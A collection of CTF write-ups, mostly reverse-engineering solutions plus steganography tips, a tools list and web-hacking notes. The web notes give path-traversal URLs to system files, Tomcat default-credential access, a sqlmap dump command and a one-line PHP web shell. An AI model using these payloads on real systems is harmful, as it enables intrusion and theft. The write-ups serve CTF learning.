memset(0x7f4a77701728, '\0', 8)                                           = 0x7f4a77701728
```
We couldn't believe it was that simple. Yet, even after 2 days, nobody was able to solve. Any person who played reversing problems before could have also solved it that easily.

So, the flag is `flag{l3tt3rs_and_numb3rs_are_ov3rrat3d}`
### What I learned

Nothing, it was pretty simple. One could say `well, its also 1 line of code solved` ;P



### File: Writeups/Reversing/OPCDE-CTF-2108/ReverseMe/ReverseMe.md

# ReverseMe! - 200
```
I haven't seen a programming language like this before. EncryptedVB???

Flag is in format: flag{...}
```

## Solution

We were given an `EncryptedVB.vbe` that we needed to decrypt, so we just used a [VBS decrypter](https://master.ayra.ch/vbs/vbs.aspx) to decrypt it to `.vbs` and then we just opened in `Notepad` we find the flag `flag{Encrypted_VBscript__What_a_Country}`

### What I learned

Nothing, very easy.



### File: Writeups/Reversing/OPCDE-CTF-2108/bin_mirrors/bin_mirrors.md

# bin_mirrors - 300
```
A strange character wants to help us escape the Matrix but he is missing a key that will allow him to use a secret phone line that will transport us out of it. Can you give him what he needs to get the flag...I mean...key?

Flag is in format: flag{...}
```
## Solution

We were given a `ELF` file that we needed to reverse so we import it to `IDA`
In `IDA` we see `main` that says
```
puts("*******************************************************************************");
  puts("[*] Hello there...");
  puts(
    "[*] I would like to show you the path that will allow you to exit the Matrix. Unfortunately, I cannot find the file "
    "with the key to the secret phone line");
  if ( argc > 2 )
  {
    if ( argc <= 3 )
    {
      v12 = atoi(argv[1]);
      if ( v12 > 9 )
      {
        puts("[*] Perfect! Let me see if that works...");
        if ( v12 == 31337 )
        {
          v10 = i_func(31337);
          v11 = v4;
          sprintf(&s, "%llu", v10, v4);
          v5 = strlen(argv[2]);
          filename = (char *)malloc(v5);
          filename = (char *)argv[2];
          ptr = (void *)v_func(filename);
          v7 = c_func((int)&s, (char *)ptr);
          if ( v7 )
          {
            puts("[*] I got the tools to read the key, but the pieces are not matching");
          }
          else
          {
            printf("[*] We got it! The flag...I mean...key...is: flag{");
            r_func((char *)ptr);
            puts("}");
            puts("[*] Now let's exit the Matrix");
          }
          puts("*******************************************************************************");
          free(ptr);
          result = 0;
```

So we should have `2` arguments to pass to the flag functions.
As per the `if statements` the first key is `31337` but we couldnt figure out the second key from the `main` function. So we looked into each other function for any hidden values and we find in `r_func` this

```
 v29 = strlen(a1);
    if ( v29 <= i )
      break;
    sprintf(&s, "%llu", v90, v91);
    if ( !i && s == *a1 )
    {
      v88 = i_func(114);
      v89 = v1;
      sprintf(&nptr, "%llu", v88, v1);
      v2 = strtol(&nptr, 0, 2);
      v59[i] = v2;
    }
    if ( i == 1 && v46 == a1[1] )
    {
      v86 = i_func(101);
      v87 = v3;
      sprintf(&v43, "%llu", v86, v3);
      v4 = strtol(&v43, 0, 2);
      v59[i] = v4;
    }
```
If you look closely at `i_func(114)`, `114` is the `ASCII` repsentation of char `r` and `101` is `e`. So, when we look till the end we get `red_pill_truth`, so the flag is `flag{red_pill_truth}`

### What I learned

Check everything first before debugging through the code.



### File: Writeups/Reversing/Shellterlabs/B0mb/B0mb.md

# B0mb
```
Once more we need your help to deactivate a bomb. We got the software that is being executed inside the bomb.
Can you figure out the sequence of numbers to defuse the bomb? Be careful!
```
## Solution

We check the file format by `file <name>` and we see `ELF 64-bit LSB shared object, x86-64`
Now, we run it by `./<name>` and we get this

```
[*] Defuse the bomb with the right sequece of secret numbers
[+] Enter the first number:
```

If we enter a random number we get `[BOOM] You're dead x.x!` and then we exit.
So, we import it to `IDA 64` and we inspect the `main` function by pressing `F5`

```
  int result; // eax
  unsigned int v4; // [rsp+4h] [rbp-Ch]
  unsigned int v5; // [rsp+8h] [rbp-8h]
  unsigned int v6; // [rsp+Ch] [rbp-4h]

  puts("[*] Defuse the bomb with the right sequece of secret numbers ");
  printf("[+] Enter the first number: ", argv);
  __isoc99_scanf("%d", &v6);
  if ( v6 != 308
    || (printf("[+] Enter the second number: "), __isoc99_scanf("%d", &v5), v5 != 19)
    || (printf("[+] Enter the third number: "), __isoc99_scanf("%d", &v4), v4 != 837) )
  {
    puts("[BOOM] You're dead x.x! ");
    result = 0;
  }
  else
  {
    puts("[+] Bomb defused");
    printf("[+] shellter{yeah_th3_s3qu3nc3_1s:(%d_%d_%d)} \n", v6, v5, v4);
    result = 1;
  }
  return result;
```

If we look down we see the flag `shellter{yeah_th3_s3qu3nc3_1s:(%d_%d_%d)` where each `d` is a double value.
When we look back up we see an if statment that compares each variable with the correct secret numbers.
So if we run the program again with the correct numbers in order 308 -> 19 -> 837 we get

```
[*] Defuse the bomb with the right sequece of secret numbers
[+] Enter the first number: 308
[+] Enter the second number: 19
[+] Enter the third number: 837
[+] Bomb defused
[+] shellter{yeah_th3_s3qu3nc3_1s:(308_19_837)}
```

which is the flag `shellter{yeah_th3_s3qu3nc3_1s:(308_19_837)}`



### File: Writeups/Reversing/Shellterlabs/Be_Wild/Be_Wild.md

# Be Wild

Easy. Analyze the binary and find the flag

## Solution

We look at the file format with `file <name>` and we see `ELF 64-bit LSB executable`.
Then we run it using `./<name>` and we see `Authenticate:` if we type anything in we get `AUTHENTICATION FAILED! Intrusion Alert!`
Now, lets try to debug it by `IDA 64`.
If we look at the `main` function by pressing `F5` we see
``` 
printf(
    "Authenticate: ",
    argv,
    envp,
    446676598899LL,
    463856468069LL,
    498216206444LL,
    489626271845LL,
    489626271867LL,
    416611827813LL,
    450971566180LL,
    442381631598LL,
    511101108269LL,
    429496729705LL,
    193273528421LL,
    446676598883LL,
    489626271841LL,
    536870912115LL,
    *(_QWORD *)&v18);
  fgetws(&ws, 29, _bss_start);
  if ( !wcscmp(s1, &ws) )
    printf("Welcome!\n\t The FLAG is: %ls\n", s1);
  else
    puts("\tAUTHENTICATION FAILED! Intrusion Alert!");
  return 0;
}
```
Which the flag is the output of `%ls` which is a `wide char`. We tried looking everywhere in the debugger for any signs of the flag but we couldnt detect it.
Instead, we used the `NOP` solution. We thought of removing the `if ( !wcscmp(s1, &ws) )` by `Edit -> Patch Program -> Assemble` then we just replace the `jnz     short loc_400784` with 2 `nop`.
This basically just removes the comparision out of the way and display's the flag for us.
```
  fgetws(&ws, 29, _bss_start);
  wcscmp(s1, &ws);
  printf("Welcome!\n\t The FLAG is: %ls\n", s1);
  return 0;
```
Now we just `Edit -> Patch Program -> Apply Patches to input file.` Then we just run the excutble again. No matter what you type, you'll get the flag
```
Authenticate: I need some sleep
Welcome!
         The FLAG is: shellter{reading-wide-chars}
```
   



### File: Writeups/Reversing/Shellterlabs/Evil_Barney/Evil_Barney.md

# Evil Barney


[Evil Barney](https://shellterlabs.com/en/questions/4-hnr-salve-vilma/evil-barney/)

## Solution

We start off by checking the file format by `file <name>` which is `ELF 64-bit LSB executable, x86-64`
Then we try to execute it by `./<name>` and we see this

![1](https://github.com/GHAFRI/Writeups/blob/master/Reversing/Shellterlabs/Evil_Barney/1.png)
![2](https://github.com/GHAFRI/Writeups/blob/master/Reversing/Shellterlabs/Evil_Barney/2.png)

Which seems like useless information to find the flag so we import it on `IDA 64`
We check on the `main` function C code by pressing `F5` and we can see 
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _BYTE *v3; // rax

  v3 = malloc(0x1EuLL);
  p = (__int64)v3;
  *v3 = 67;
  *(_BYTE *)(p + 1) = 111;
  importantInfo();
  importantInfo2();
  importantInfo3();
  importantInfo4();
  importantInfo5();
  scramble();
  return reveal();
}
```

Which is a bunch of function calls, so we go deeper in each.
We see that each have the sentence that is shown before but if we look closer at `importantinfo` function we see

```
  *(_BYTE *)(p + 2) = 100;
  *(_BYTE *)(p + 3) = 101;
  result = p + 10;
  *(_BYTE *)(p + 10) = 97;
  return result;
```

This is ASCII where 100 -> d , 101 -> e , 97 -> a
Then we looked back at the main function and we can see 

```
*v3 = 67;
  *(_BYTE *)(p + 1) = 111;
```

67 -> C , 111 -> o
Then we continue on to each function then we discover `CodeaNanmey_Bre` which is not the flag.
We look back at the question and translate it back to english we see `I never liked Barney. It messes everything up!`
So when we look back to `importantinfo` we see that the order is distributed within each fucntion.
Instead of having 2,3,10 then 4,5,11 we arrange everything inorder and we get `CodeName_Barney` which is the flag.







### File: Writeups/Reversing/Shellterlabs/MacRevEngER/MacRevEngER.md

# MacRevEngER

`We need experts looking into this binary. Can you help us figure this flag out?`

## Solution

We check the file format by `file <name>` and we see its `Mach-O 64-bit x86_64 executable`
Now we know its not possible to excute this in Lunix without having the Mach library so we import it staright up in `IDA 64`.
Looking at the `main` function by pressing `F5` we see
```
puts("\nChallenger Basic for Criptorave 2017");
  memcpy(&v51, &unk_1000016B0, 0x2AuLL);
  memcpy(&v50, &unk_1000016E0, 0x2CuLL);
  memcpy(&v49, &unk_100001710, 0x2AuLL);
  memcpy(&v48, &unk_100001740, 0x2AuLL);
  memcpy(&v47, &unk_100001770, 0x2AuLL);
  memcpy(&v46, &unk_1000017A0, 0x2AuLL);
  memcpy(&v45, &unk_1000017D0, 0x2AuLL);
  memcpy(&v44, &unk_100001800, 0x2AuLL);
  memcpy(&v43, &unk_100001830, 0x2AuLL);
  memcpy(&v42, &unk_100001860, 0x2AuLL);
  memcpy(&v41, &unk_100001890, 0x2AuLL);
  memcpy(&v40, &unk_1000018C0, 0x2AuLL);
  memcpy(&v39, &unk_1000018F0, 0x2AuLL);
  memcpy(&v38, &unk_100001920, 0x2AuLL);
  memcpy(&v37, &unk_100001950, 0x2AuLL);
  puts("\nWelcome to RTFM (Red Team Freakin' Maniacs) Challenger Level-1 N00b.\n");
  memcpy(&v36, &unk_100001980, 0x2AuLL);
  memcpy(&v35, &unk_1000019B0, 0x2AuLL);
  memcpy(&v34, &unk_1000019E0, 0x2AuLL);
  memcpy(&v33, &unk_100001A10, 0x2AuLL);
  memcpy(&v32, &unk_100001A40, 0x2AuLL);
  memcpy(&v31, &unk_100001A70, 0x2AuLL);
  memcpy(&v30, &unk_100001AA0, 0x2AuLL);
  memcpy(&v29, &unk_100001AD0, 0x2AuLL);
  memcpy(&v28, &unk_100001B00, 0x2AuLL);
  memcpy(&v27, &unk_100001B30, 0x2AuLL);
  memcpy(&v26, &unk_100001B60, 0x2AuLL);
  memcpy(&v25, &unk_100001B90, 0x2AuLL);
  memcpy(&v24, &unk_100001BC0, 0x2AuLL);
  memcpy(&v23, &unk_100001BF0, 0x2AuLL);
  memcpy(&v22, &unk_100001C20, 0x2CuLL);
  memcpy(&v21, &unk_100001C50, 0x2AuLL);
  memcpy(&v20, &unk_100001C80, 0x2AuLL);
  memcpy(&v19, &unk_100001CB0, 0x2AuLL);
  memcpy(&v18, &unk_100001CE0, 0x2AuLL);
  memcpy(&v17, &unk_100001D10, 0x2AuLL);
  memcpy(&v16, &unk_100001D40, 0x2AuLL);
  memcpy(&v15, &unk_100001D70, 0x2AuLL);
  memcpy(&v14, &unk_100001DA0, 0x2AuLL);
  memcpy(&v13, &unk_100001DD0, 0x2AuLL);
  memcpy(&v12, &unk_100001E00, 0x2AuLL);
  memcpy(&v11, &unk_100001E30, 0x2AuLL);
  memcpy(&v10, &unk_100001E60, 0x2AuLL);
  memcpy(&v9, &unk_100001E90, 0x2AuLL);
  memcpy(&v8, &unk_100001EC0, 0x2AuLL);
  memcpy(&v7, &unk_100001EF0, 0x2AuLL);
  puts("Please Show me your Skills in Reversing and Debbugers.\n");
  memcpy(&v6, &unk_100001F20, 0x2CuLL);
  memcpy(&v5, &unk_100001F50, 0x2AuLL);
  memcpy(&v4, &unk_100001F80, 0x2AuLL);
  if ( __stack_chk_guard != v52 )
    __stack_chk_fail(&v4, &unk_100001F80);
  return 0;
}
```
So we see a bunch of memory copy of some sort but what we find intresting is that all are `0x2AuLL` which are empty but 3 are `0x2CuLL` 
If we look at each of the 3 `&unk_100001???` location we find
```
x
0
0

x
0
0

etc..

```
And then we take each as a normal line we get
```
x00 x00 x00 x70 x61 x73 x74 x65 x62 x69 x00
x00 x00 x00 x6e x2e x63 x6f x6d x2f x36 x00
x00 x00 x00 x4e x51 x70 x51 x48 x73 x78 x00
```
which is hex, so we convert it to text we get `pastebin.com/6NQpQHsx` (remove the invalid characters inbetween).
If we check the site we get `rev_basic_c_cryptorave2017` which is not the flag. 
Cryptorave has a flag format so the correct flag is `CR2017{rev_basic_c_cryptorave2017}`.







### File: Writeups/Reversing/Shellterlabs/Rev_1/Rev_1.md

# Rev 1
```
The flag is in the file. 

Tip1: Ta within 

Format: R00T _ @ _ RSi {su4_fl4g}
```

## Solution:

We start of by checking the file format by `file <name>` and we see `Java archive data (JAR)`.
We run it and we get this

![1](https://github.com/GHAFRI/Writeups/blob/master/Reversing/Shellterlabs/Rev_1/1.png)

It seems like a messaging app that has a login and register form.
To decompile `Jar` files we use [Jadx](https://github.com/skylot/jadx).
If we look at the `Login` class we see 2 classes and a `cipher` function
```
	public static String m2u(String str) {
        return Login_Page.cipher("ebbg@efv");
    }

    /* renamed from: p */
    public static String m1p(String str) {
        return Login_Page.cipher("c0q33age4ee00g");
    }


    public static String cipher(String str) {
        char[] toCharArray = str.toCharArray();
        for (int i = 0; i < toCharArray.length; i++) {
            char c = toCharArray[i];
            if (c >= 'a' && c <= 'z') {
                c = c > 'm' ? (char) (c - 13) : (char) (c + 13);
            } else if (c >= 'A' && c <= 'Z') {
                c = c > 'M' ? (char) (c - 13) : (char) (c + 13);
            }
            toCharArray[i] = c;
        }
        return new String(toCharArray);
    }
```

We have the username and password but it seems that the `cipher` function `decrypts` them with a `shift` of `13` as indicated.
So, we get `ebbg@efv` -> `root@rsi` and `c0q33age4ee00g` -> `p0d33ntr4rr00t`.
Now, we just login with those and we get the flag `R00T_@_RSi{j4v4_1ts_4_j0k3}`.




### File: Writeups/Reversing/Shellterlabs/Rev_2/Rev_2.md

# Rev 2
```
The pyc file is a token generator that only gives the correct token at a given time. Use this correct token to find the flag. 

Tip1: You need to run multiple times quickly. 

Format: R00T _ @ _ RSi {SU4_FL4G}
```

## Solution

We extract the `zip` file and we see `randomscript.pyc`file, its `python`.
We attempt to use `strings randomscript.pyc` to get any leads and we get
```
GHnx
GHnI
GHn^
GHn/
login:user,senha:P0RT44B3RT4i
R00T_@RSi{t
3NG3NH4R1A_R3V3RS4_1T'S_C00L%si
timet
hashlibt
base64t
```

Simply, the flag is `R00T_@_RSi{3NG3NH4R1A_R3V3RS4_1T'S_C00L}`


### File: Writeups/Reversing/Shellterlabs/access_pass/access_pass.md

# Access Pass

```
Review the binary and find out how to circumvent your password verification.

password: shellter
format: shellter{flag}
```

## Solution

We start of by checking file format with `file <name>` and we see `ELF 32-bit LSB shared object`
Now lets run it by `./<name>` and we get
```
Uso: ./brn [senha]
```
It needs an `args` so we add `./brn hello` we get back `Sai daqui, porra!` and we exit.
Now, we import it to `IDA 32`.
We check the `main` function by excuting `F5`.
Inside we see
``` 
v17 = &argc;
  v14 = 7746418;
  v12 = 17236;
  v13 = 0;
  v11 = 7565875;
  v9 = 18043;
  v10 = 0;
  v8 = 3366707;
  v6 = 21825;
  v7 = 0;
  v4 = 26478;
  v5 = 0;
  v16 = 666;
  if ( argc > 1 )
  {
    v15 = atoi(argv[1]);
    if ( v16 == v15 )
      printf("Tome sua flag: %s%s%s%s\n", &v14, &v11, &v8, &v4);
    else
      puts("Sai daqui, porra!");
    result = 0;
  }
  else
  {
    printf("Uso: %s [senha]\n", *argv);
    result = 1;
  }
  return result;
```

We see an if statment that compares what we `input` as `args` with variable `v16` which equals `666`. 
Therefore, if we run `./brn 666` we get `Tome sua flag: r3v3rs3_3ng`. The flag simply is `shellter{r3v3rs3_3ng}`



### File: Writeups/Reversing/Shellterlabs/dont_be_a_kiddie/dont_be_a_kiddie.md

# Don't be a Kiddie

`Reverse Me`

## Solution

We start of by checking file format by `file <name>` and we get ` ELF 32-bit LSB executable`
We run it and we get 
```
You're supposed to give me something...
```
It needs `args` so we wrote `./<name> hello`
```
You gave me: hello 

		...I'm waiting for something different...
```

So, we begin by importing it to `IDA 32`. We check the `main` function by excuting `F5`.
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest; // [esp+13h] [ebp-7A5Dh]
  char v5; // [esp+14h] [ebp-7A5Ch]
  char v6; // [esp+15h] [ebp-7A5Bh]

  if ( argc == 1 )
  {
    puts("\n\tYou're supposed to give me something...\n");
    exit(1);
  }
  strncpy(&dest, argv[1], 0x7A5Du);
  if ( dest != 107 || v5 != 101 || v6 != 121 )
    printf("\n\t You gave me: %s \n", &dest);
  else
    key();
  printf("\n\t\t...I'm waiting for something different...");
  arith((char *)argv[1], &dest);
  puts("\n");
  return 0;
}
```
Everything that happens in the `main` function is useless and wont generate anything. 
Even when we check the functions on the right such as `key`, `footsteps` and `skull` are just text jokes.
The real key is the function `reveal` and the function that calls it is `flag` so we had to call it in the main function.
In `main` we see `puts("\n");` so lets replace that with the function.
To do that we switch back to the `IDA View-A` tab then we look up the `call    _puts`.
The we go to `Edit -> Patch Program -> Assemble` and change it to `call    flag`.
Now we need to save by `Edit -> Patch Program -> Apply Patches to input file.`
Lets run it again and we see
```
	 You gave me: hello 

		...I'm waiting for something different...
	     ___                             
	     \_/                             
	      |._                            
	      |'."-._.-""--.-"-.__.-'/       
	      |  \       .-.        (        
	      |   |     (@.@)        )       
	      |   |   '=.|m|.='     /        
	 jgs  |  /    .='`"``=.    /         
	      |.'                 (          
	      |.-"-.__.-""-.__.-"-.)         
	      |                              
	      |                              
	      |                              
	**********************************
	******** I'mNotAKiddie ***********
	**********************************
```

There, the flag is `I'mNotAKiddie`.



### File: Writeups/Reversing/Shellterlabs/need_a_slave/need_a_slave.md

# Need a Slave

`Reverse me`

## Solution

We check the file format by `file <name>` and we see `ELF 32-bit LSB executable`.
Then we run it by `./<name>` and we get `cannot execute binary file: Exec format error`, so we can't run it.
Now, lets import it to `IDA 32`.
If we look at `main` function using `F5` we see multiple function calls
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  palindrome();
  diamond();
  dectobin();
  floydstriangle();
  armstrong();
  fibonacci();
  foo();
  return 0;
}
```
If we look at `armstrong`,`fibonacci` and `foo` functions we can see hidden code that contain ASCII code.
If we look back at the first 2 they contain garbage ASCII but `foo` has genuine ASCII.
We convert the ASCII in order we get `fIW!unY0IB3vcom3MySl@e` but if we order it like this
```
byte_804A313 = 117;
byte_804A310 = 110;
byte_804A311 = 89;
byte_804A312 = 48;
```
As 
```
byte_804A310 = 117;
byte_804A311 = 110;
byte_804A312 = 89;
byte_804A313 = 48;
```
And we get
```
 byte_804A30B = 73;
 byte_804A30C = 102;
 byte_804A30D = 73;
 byte_804A30E = 87;
 byte_804A30F = 33;
 byte_804A310 = 110;
 byte_804A311 = 89;
 byte_804A312 = 48;
 byte_804A313 = 117;
 byte_804A314 = 66;
 byte_804A315 = 51;
 byte_804A316 = 99;
 byte_804A317 = 111;
 byte_804A318 = 109;
 byte_804A319 = 51;
 byte_804A31A = 77;
 byte_804A31B = 121;
 byte_804A31C = 83;
 byte_804A31D = 108;
 byte_804A31E = 64;
 byte_804A31F = 118;
 byte_804A320 = 101
 byte_804A321 = 10;
```
Which is the flag `IfIW!nY0uB3com3MySl@ve`


### File: Writeups/Reversing/Shellterlabs/todo/todo.md

# Todo

`What is the next mission?`

## Solution

We start of by checking file format with `file <name>` and we see `ELF 64-bit LSB executable, x86-64`
Now lets run it by `./<name>` and we get
```
 ./todo <...>
```
It needs an `args` so we add `./todo hello` we get back `Bem vindo!` and we exit.
Now, we import it to `IDA 64`.
We see over 1000 functions on the right, the `main` function is useless, but if we look a little down we see 3 human named functions such as `vai`, `tacertu` and `numvai`.
If we inspect those we see words like `H@c|<Ers_C@n_|3e_Ev3rYw]-[eRe` which is not the flag.
However, function `numvai` has a sentence `\tMISSAO: Kissy Goldfinger-Spying Santa` so the flag is `Kissy Goldfinger-Spying Santa`.



### File: Writeups/Reversing/Shellterlabs/winners/winners.md

# Winners

`Reverse Me`

## Solution

We start of by checking file format with `file <name>` and we see `ELF 32-bit LSB executable`
Now lets run it by `./<name>` and we get
```
--------------------------------------------------------------------
--------------------------------------------------------------------
	        _~      
	     _~)_) _~   
	    )_))_))_)   
	    _!__!__!_   
	    \______t/  
	  ~~~~~~~~~~~~~

	 A new land is near...Let's anchor for a while...

--------------------------------------------------------------------
--------------------------------------------------------------------
```
We continue by pressing `[ENTER]` to the very end. We get some clues like 
```
ejm97

BjI7y&l~}<~-][=234af456f?tip=VG8gZm  
luZCB5b3VyIHRyZWFzdXJlLCBmb2xsb3cgdGh 
lIG1hcCBpbnN0cnVjdGlvbnMuLi4=

_FTW<h@c|
```
Those are not the flag, so we import to `IDA 32`.
If we look at the `main` function by pressing `F5` we see
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  cship();
  cskull();
  cmap();
  cfootsteps();
  crip();
  ckey();
  cfootsteps();
  cchest();
  inside1();
  inside2();
  puts("\n");
  return 0;
}
```
All those functions are just garbage clues except function `inside2`. 
Inside we see 
```
void inside2()
{
  _BYTE *ptr; // ST1C_4

  system("clear");
  printf("--------------------------------------------------------------------");
  printf("\n--------------------------------------------------------------------");
  ptr = malloc(0xAu);
  reveal(ptr);
  scramble((int)ptr);
  printf("\n\tI've found the map, the KEy, the chest...");
  printf("\n\t\t...Wa-wait... What's happening...");
  printf("\n\t*********************************************");
  printf("\n\t**                                         **");
  printf("\n\t**  Revealing what you're looking for...   **");
  printf("\n\t**                                         **");
  printf("\n\t**             %s                   **", ptr);
  printf("\n\t**                                         **");
  printf("\n\t*********************************************");
  putchar(10);
  printf("--------------------------------------------------------------------");
  printf("\n--------------------------------------------------------------------");
  __isoc99_scanf("%c", &hit);
  free(ptr);
}
```
which shows that function `reveal` returns the flag, however the function `scramble` destroys it. 
Therefore, all we have to do is remove `scramble` function.
To do that we switch back to the `IDA View-A` tab then we look up the `call    scramble`.
The we go to `Edit -> Patch Program -> Assemble` and change it to `nop` 5 times.
Now we need to save by `Edit -> Patch Program -> Apply Patches to input file.`
Lets run it again and we see at the end
```
--------------------------------------------------------------------
--------------------------------------------------------------------
	I've found the map, the KEy, the chest...
		...Wa-wait... What's happening...
	*********************************************
	**                                         **
	**  Revealing what you're looking for...   **
	**                                         **
	**             h@c|<_FTW                   **
	**                                         **
	*********************************************
--------------------------------------------------------------------
--------------------------------------------------------------------
```
The flag is `h@c|<_FTW`.


### File: Writeups/Reversing/Tips and Tricks.md

# Tips and tricks I used when solving reverso:
## CFF Explorer
Is a tool that helps in extracting data tables from an executable.

## Conversions:
### Convert from Hex file to Binary file:
`xxd -r -p input.txt output.txt`
## Scripts:

### Simple Flag Scrip #1
If you find a messy string of the flag and found a value table for it, use this script to recover it:  
```py3
data = "messy flag string"
values = [Values in 0x00]
total = ""
for x in range(len(values)):
	total += data[values[x]]
	print(total)
```

### Bruteforce elf:
A simple bruteforcer that whenever a correct followup character of the flag is given.  
(bfelf.rb)
```rb
flag = ''
until flag[-1] == '}'
  [*'A'..'Z', *'a'..'z', *'0'..'9', '_', '{', '}'].each do |ch|
    result = `./file #{flag + ch}`
    if result.include? 'flag'
      flag += ch
      puts flag
      break
    end
  end
end
puts flag
```



### File: Writeups/Stegnography/Tips and Tricks.md

# Set of tips and tricks I used to solve some challanges:

## [Jeffrey's Image Metadata Viewer](http://exif.regex.info/exif.cgi)
A good website that helped me solve a couple of challanges related to text hidden in exif.

## [XOR TOOL](https://github.com/hellman/xortool)
If you find an image to be `xor` you can use the `xortool` to decrypt the image, by default use `-c 00`:  
`xortool -c 00 image.png`  
this will create a folder with decrypted image file if a key is found.


## [Python Steganography](https://pypi.org/project/steganography/0.1.1/)
I used this tool to solve a challange:  
`steganography -d file.jpg`

## RBG Planes
If you have an image opened in `stegsolve` and you see a small portion of it visible in a set of planes like in only `red plane 0`, `blue plane 0` and `green place 0` then you can create a preview regarding those bit planes and find the flag in the header.

## Whitespace
if you come across a challange that has white space in it, then its not a couincidence, use this tool:  
`http://vii5ard.github.io/whitespace/`  
it will save you big time.

## Thumbnail:
If you come accross an image that has a thumbnail using `exiftool` then you can simple extract it using  
`exiftool -b -ThumbnailImage image.jpg > thumb1.jpg`  
if the new image also has another thumbnail then repeat the above command.

## Video that shows text:
### There Are 2 ways to solve this:
### #1:
use `ffmpeg` tool to extract each frame image of the video:  
`ffmpeg -i video.mp4 -vf "fps=1" out%0d.png`  
then we use `tesseract`, an OCR engine to extract text from the image:  
```
for file in $(ls . | grep png); do
    echo "image:${file}";
    tesseract $file - | grep -i flag
done
```

### #2:
we use `mplayer` that uses `ffmpeg` to extract each frame image.   
`mplayer -vf framestep=60 -framedrop -nosound video.mp4 -speed 100 -vo jpeg:outdir=video`  
and then we OCR it to text files  
`cd video; ls *.jpg | xargs -t -i tesseract {} {}`  
and finally we `grep flag`  
`grep -Ri "flag" *.txt`



### File: Writeups/Stegnography/UAE National Cyber Security CTF Finals 2018/Listen Carefully/Listen Carefully.md

# Listen Carefully

![0](https://github.com/GHAFRI/Writeups/blob/master/Stegnography/UAE%20National%20Cyber%20Security%20CTF%20Finals%202018/Listen%20Carefully/Listen%2Bcarefully.jpg)

We are given an Image file that is large enough to have something hidden in it.
So we start of by using `HxD` to look for anything hidden in the hex code, as we scroll down we find this.

![1](https://github.com/GHAFRI/Writeups/blob/master/Stegnography/UAE%20National%20Cyber%20Security%20CTF%20Finals%202018/Listen%20Carefully/1.PNG)

It's `WAVE` file signature so we extract everything beggining with `RIFFX` to the end and we end up with a sound file. To deal with sound files, we use `Audacity`.
So we start of by switching from `Waveform` to `Spectogram` of the file and we find a hash.

![2](https://github.com/GHAFRI/Writeups/blob/master/Stegnography/UAE%20National%20Cyber%20Security%20CTF%20Finals%202018/Listen%20Carefully/2.png)

Turns out that this is the flag.

![3](https://github.com/GHAFRI/Writeups/blob/master/Stegnography/UAE%20National%20Cyber%20Security%20CTF%20Finals%202018/Listen%20Carefully/3.png)











### File: Writeups/Tools/Tools.md


For Zip Files:

    unzip 
    
will often output helpful information on why a zip will not decompress.

    zipdetails -v 
    
will provide in-depth information on the values present in the various fields of the format.

    zipinfo 
    
lists information about the zip file's contents, without extracting it.

    zip -F input.zip --out output.zip 
    zip -FF input.zip --out output.zip 
    
attempt to repair a corrupted zip file.

===========================================================================================================

[DnSpy](https://github.com/0xd4d/dnSpy) - Good to decompile .NET exe files.

[Easy Python Decompiler](https://sourceforge.net/projects/easypythondecompiler/) - Decompile Python code.

[Jadx](https://github.com/skylot/jadx) - Decompiler for Jar files



### File: Writeups/Web/Notes.md

# Tips and Tricks for Web

## Robots
Sometimes you gotta check out for `/robots.txt`

## Website Loopback:
If a challange asks for Preview a URL, we can use a [Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) or a [nip](https://nip.io/) or [loopback](https://qiita.com/shimoju/items/81ed5055d2fec5bb9c1e) to exploit a vulnerability in DNS to get the flag

## PHP
### PHP []
When Submit was pressed, a POST request was sent to the server containing:  `password=yourinput`
We break the application by passing an array as the password:  `password[]=`

### PHP Code Page:
If you are presented with a page that has a line of PHP code like:
```php
<?php
$hashed_key = '79abe9e217c2532193f910434453b2b9521a94c25ddc2e34f55947dea77d70ff';
$parsed = parse_url($_SERVER['REQUEST_URI']);
if(isset($parsed["query"])){
    $query = $parsed["query"];
    $parsed_query = parse_str($query);
    if($parsed_query!=NULL){
        $action = $parsed_query['action'];
    }

    if($action==="auth"){
        $key = $_GET["key"];
        $hashed_input = hash('sha256', $key);
        //echo $hashed_input.'\n';
        if($hashed_input!==$hashed_key){
            die("GTFO!");
        }

        echo file_get_contents("/flag");
    }
}else{
    show_source(__FILE__);
}
?>
```
Then you need to excute the commands in the url line such as `<host>/?action=auth&`  
So, inorder to get the flag from the above, we need to make our own `key` with `$ echo -n test | sha256sum` that will give us the new key `9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08` and now we execute in the url `<host>/?action=auth&key=test&hashed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08` which will give us the flag

## Web Upload

If we have a LFRU (Local File Remote Upload) we use:
`http://website.com:port/files/../../../../etc/pass`.
If that doesnt work we then use
`http://website.com:port/files/..%2F..%2F..%2F..%2Fetc%2Fpass`
for LFI.

If `etc/pass` is useless we use then `/proc/self/environ` by `http://website.com:port/files/..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron`
Add more %2F inbetween if needed.

## Tomcat Manager
Apache Tomcat has a `manager`, so inorder to access him we place this at the end of the url `/manager/html`.  
If luck still isnt on our side, we add tomcat default credentials too at the begining of the url, such as: `http://tomcat:tomcat@host:proxy/manager/html`


## dirsearch

python3 dirsearch.py -u host --proxy=http://host:port/ -e sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar

## SQL Map
### SQL Injection
If we have a input box vulnerable to `SQL Injection`, we can execute this command through a `POST` request:  
`sqlmap.py -r post.txt -p id --dump`  
In the post file we will have the `POST` request, we can get it from `Google Developer tools` or `Burp`  
(post.txt)
```sh
POST /index.php HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://host/index.php
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
 
id=a&submit1=submit
```

## Image Valun
<?php system($_GET['cmd']); die(); ?>



### File: Writeups/Web/OverTheWire/Natas/Natas12/Natas12.md

# [Natas 12](http://natas12.natas.labs.overthewire.org/)

